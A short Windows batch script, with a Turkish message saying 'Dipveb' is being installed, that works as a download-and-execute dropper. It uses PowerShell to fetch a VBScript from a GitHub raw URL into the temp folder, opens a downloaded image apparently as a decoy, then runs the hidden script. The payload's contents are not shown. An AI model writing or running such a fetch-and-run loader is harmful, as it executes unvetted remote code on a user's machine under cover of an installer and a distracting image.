echo Dipveb indiriliyor...
del %temp%\darkvebkilir.vbs
powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/iloveichigo/dipveb/main/dipveb.vbs -OutFile %temp%\darkvebkilir.vbs
powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/iloveichigo/dipveb/main/dipvebinstallation.bmp -OutFile dipveb.bmp
dipveb.bmp
ping 127.0.0.1 -t 4 > nul
%temp%\darkvebkilir.vbs
